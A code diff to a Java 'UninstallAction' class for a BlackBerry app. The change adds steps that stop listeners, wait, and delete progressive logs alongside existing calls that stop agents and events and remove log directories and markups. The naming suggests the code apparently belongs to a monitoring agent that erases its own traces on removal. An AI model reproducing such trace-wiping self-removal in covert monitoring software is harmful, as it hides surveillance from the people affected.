@@ -7,14 +7,17 @@
  * *************************************************/
 package blackberry.action;
 
+import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
 import blackberry.AgentManager;
 import blackberry.EventManager;
+import blackberry.Main;
 import blackberry.event.Event;
 import blackberry.log.LogCollector;
 import blackberry.log.Markup;
 import blackberry.utils.Check;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -59,11 +62,18 @@ public final class UninstallAction extends SubAction {
 
         wantUninstall = true;
 
+        Main main = (Main) Application.getApplication();
+        main.stopListeners();
+
         AgentManager.getInstance().stopAll();
         EventManager.getInstance().stopAll();
 
+        Utils.sleep(2000);
+
         LogCollector.getInstance().removeLogDirs();
         Markup.removeMarkups();
+
+        LogCollector.getInstance().removeProgressive();
 
         final ApplicationDescriptor ad = ApplicationDescriptor
                 .currentApplicationDescriptor();
